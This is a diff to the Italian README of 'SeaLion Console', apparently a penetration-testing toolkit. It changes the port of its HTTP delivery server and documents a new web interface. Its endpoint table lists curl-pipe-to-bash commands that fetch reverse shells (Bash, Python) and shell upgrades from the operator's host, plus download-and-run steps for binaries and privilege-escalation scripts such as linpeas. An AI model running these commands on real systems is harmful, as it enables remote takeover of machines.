@@ -114,18 +114,49 @@ slconsole> serve help                        # Documentazione completa
 
 | Endpoint | Curl |
 |----------|------|
-| `/upgrade` | `curl http://<IP>:8000/upgrade \| bash` — upgrade shell (socat/python pty) |
-| `/rev` | `curl http://<IP>:8000/rev \| bash` — reverse shell Bash |
-| `/sh` | `curl http://<IP>:8000/sh \| bash` — reverse shell Python |
+| `/upgrade` | `curl http://<IP>:2727/upgrade \| bash` — upgrade shell (socat/python pty) |
+| `/rev` | `curl http://<IP>:2727/rev \| bash` — reverse shell Bash |
+| `/sh` | `curl http://<IP>:2727/sh \| bash` — reverse shell Python |
 
 ### File statici
 
 Qualsiasi file messo nella cartella `static/` viene automaticamente servito e mostrato in `serve list` e `serve on` con il comando curl corretto:
-- `.sh` → `curl http://<IP>:8000/file.sh | bash`
-- `.exe` → `curl http://<IP>:8000/file.exe -o file.exe`
-- binari → `curl http://<IP>:8000/file -o file && chmod +x file`
+- `.sh` → `curl http://<IP>:2727/file.sh | bash`
+- `.exe` → `curl http://<IP>:2727/file.exe -o file.exe`
+- binari → `curl http://<IP>:2727/file -o file && chmod +x file`
 
 Usa `serve fetch` per scaricare automaticamente linpeas, winpeas, pspy, linenum e altri.
+
+---
+
+## SLWeb — Piattaforma Web
+
+**SLWeb** (SeaLionWeb) è la piattaforma web integrata in SeaLion Console. Si avvia automaticamente insieme alla console sulla porta `2727` e permette di consultare tutti i contenuti dal browser.
+
+### Cosa offre
+
+| Sezione | URL | Contenuto |
+|---------|-----|-----------|
+| **Home** | `/` | Mascotte sealsay con tips, terminale interattivo per navigare |
+| **Notes** | `/notes/` | Guide e appunti (footprinting, shells, password cracking...) |
+| **Vuln** | `/vuln/` | Cheatsheet per protocolli vulnerabili |
+| **Tools** | `/tools/` | Documentazione di tutti i tool installabili |
+| **Static** | `/static/` | Gestione file statici (crea, importa, modifica, elimina) |
+| **Delivery** | `/delivery` | Pannello curl per post-exploitation |
+
+### Come accedere
+
+SLWeb si avvia in automatico quando si lancia `slconsole`. Il link viene mostrato nel banner:
+
+```
+  SLWeb: http://<IP>:2727
+```
+
+Dalla CLI, ogni volta che si apre un file `.md` (con `vuln`, `notes` o `tool`), viene mostrato anche il link diretto alla pagina web corrispondente.
+
+### Rendering Markdown
+
+I contenuti `.md` vengono renderizzati in stile Notion con syntax highlighting per i blocchi di codice, tabelle formattate e navigazione breadcrumb.
 
 ---
 
@@ -193,7 +224,7 @@ Metti qualsiasi file nella cartella `static/` — apparira automaticamente in `s
 ```
 SeaLion/
 ├── sealion.py          # Console principale
-├── http_server.py      # Quick-Delivery Server HTTP
+├── http_server.py      # Quick-Delivery Server HTTP + SLWeb
 ├── setup.sh            # Installer (crea comandi slconsole e sealsay)
 ├── pyproject.toml      # Metadata pacchetto
 ├── ascii-art.txt       # Logo ASCII
